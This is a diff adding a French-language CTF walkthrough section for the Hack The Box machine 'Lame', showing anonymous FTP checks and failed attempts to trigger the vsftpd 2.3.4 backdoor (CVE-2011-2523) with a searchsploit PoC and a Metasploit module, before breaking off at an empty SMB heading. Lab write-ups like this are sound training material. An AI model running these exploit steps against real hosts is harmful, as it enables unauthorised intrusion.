@@ -443,11 +443,249 @@ PORT      STATE         SERVICE
 
 ## Exploitation – Prise pied (Foothold)
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+À partir des informations fournies par `mon-nmap`, tu établis une approche logique : tester en priorité le service **FTP (vsftpd 2.3.4)**, puis basculer vers **SMB (Samba 3.0.20)** si la première piste n’aboutit pas, **en suivant une démarche progressive et structurée pour obtenir un accès initial**.
+
+Tu commences donc par t’intéresser au service FTP exposé sur la machine.
+
+### FTP
+
+Comme souvent en CTF, tu commences par tester l’accès FTP anonyme lorsqu’il est explicitement autorisé par `nmap`. Cette étape permet de vérifier rapidement si des fichiers intéressants sont accessibles sans authentification, avant d’envisager des vulnérabilités plus complexes.
+
+#### Anonymous FTP
+
+```bash
+ftp lame.htb
+Connected to lame.htb.
+220 (vsFTPd 2.3.4)
+Name (lame.htb:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> pwd
+Remote directory: /
+ftp> ls -la
+229 Entering Extended Passive Mode (|||28060|).
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+226 Directory send OK.
+ftp>
+```
+
+Le service FTP accepte bien les connexions anonymes, mais aucun fichier intéressant n’est accessible.
+
+
+
+Après avoir constaté que l’accès FTP anonyme ne mène à rien, tu changes donc d’approche et passes à l’analyse des vulnérabilités connues du service FTP en fonction de sa version, en utilisant `searchsploit`.
+
+#### Searchsploit
+
+
+
+```bash
+searchsploit vsftpd 2.3.4
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                                         | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | unix/remote/17491.rb
+---------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+```
+
+
+
+Comme `searchsploit` remonte deux entrées pour **vsftpd 2.3.4**, tu commences par les récupérer en local pour comprendre ce qui est exploité, avant de lancer un test.
+
+
+
+```bash
+searchsploit -m unix/remote/49757.py
+searchsploit -m unix/remote/17491.rb
+ls -la
+```
 
 ---
+
+Les deux fichiers pointent vers **la même vulnérabilité (CVE-2011-2523)** : une version compromise de vsftpd 2.3.4 contient une **porte dérobée**. Concrètement, un nom d’utilisateur qui se termine par `:)` déclenche l’ouverture d’un **shell bind** sur le port **6200**.
+ Autrement dit : si la backdoor est présente, tu n’exploites pas “un bug FTP classique”, tu déclenches un **service shell** qui apparaît sur `6200/tcp`.
+
+#### POC
+
+```bash
+python3 49757.py                                                   
+usage: 49757.py [-h] host
+49757.py: error: the following arguments are required: host
+```
+
+
+
+```bash
+python3 49757.py lame.htb
+Traceback (most recent call last):
+  File "/mnt/kvm-md0/HTB/lame/49757.py", line 37, in <module>
+    tn2=Telnet(host, 6200)
+  File "/usr/lib/python3/dist-packages/telnetlib/__init__.py", line 219, in __init__
+    self.open(host, port, timeout)
+    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/telnetlib/__init__.py", line 236, in open
+    self.sock = socket.create_connection((host, port), timeout)
+                ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socket.py", line 864, in create_connection
+    raise exceptions[0]
+  File "/usr/lib/python3.13/socket.py", line 849, in create_connection
+    sock.connect(sa)
+    ~~~~~~~~~~~~^^^^
+TimeoutError: [Errno 110] Connection timed out
+```
+
+<br>
+
+Le PoC Python3 tente bien de déclencher la backdoor, mais la connexion au port **6200/tcp** échoue avec un *timeout*, indiquant que le *bind shell* attendu n’a pas été ouvert. 
+
+Pour confirmer ce résultat et rester rigoureux, tu vérifies ensuite cette piste à l’aide du module **Metasploit** correspondant à **vsftpd 2.3.4**.
+
+#### Métasploit
+
+Lance métasploit :
+
+```bash
+msfconsole           
+Metasploit tip: To save all commands executed since start up to a file, use the 
+makerc command
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                          3Kom SuperHack II Logon                             |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                 User Name:          [   security    ]                        |
+|                                                                              |
+|                 Password:           [               ]                        |
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                                   [ OK ]                                     |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                       https://metasploit.com |
+|______________________________________________________________________________|
+
+
+       =[ metasploit v6.4.110-dev                               ]
++ -- --=[ 2,601 exploits - 1,322 auxiliary - 1,707 payloads     ]
++ -- --=[ 431 post - 49 encoders - 14 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf >
+```
+
+
+
+```bash
+msf > search vsftpd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf > 
+
+```
+
+
+
+La recherche dans **Metasploit** confirme l’existence d’un module dédié à la vulnérabilité **vsftpd 2.3.4 Backdoor Command Execution**. Ce module va maintenant être utilisé afin de vérifier définitivement si la backdoor est exploitable sur la machine cible.
+
+
+
+```bash
+msf > use 0
+[*] No payload configured, defaulting to cmd/unix/interact
+msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported pro
+                                       xies: socks4, socks5, socks5h, http, sapni
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
+                                       asics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST lame.htb
+RHOST => lame.htb
+msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported pro
+                                       xies: socks4, socks5, socks5h, http, sapni
+   RHOSTS   lame.htb         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
+                                       asics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+[*] 10.129.70.64:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.129.70.64:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+msf exploit(unix/ftp/vsftpd_234_backdoor) > 
+```
+
+<br>
+
+Le test avec le module **Metasploit** `vsftpd_234_backdoor` confirme le résultat obtenu avec le PoC Python : aucune session n’est créée et aucun service n’apparaît sur le port attendu. La backdoor **vsftpd 2.3.4** n’est donc pas exploitable sur cette machine, ce qui permet d’écarter définitivement la piste FTP.
+
+------
+
+L’exploitation via FTP n’ayant pas abouti, l’analyse se poursuit logiquement avec le service **SMB**, également identifié lors de l’énumération initiale.
+
+### SMB
+
+
 
 ## Escalade de privilèges
 
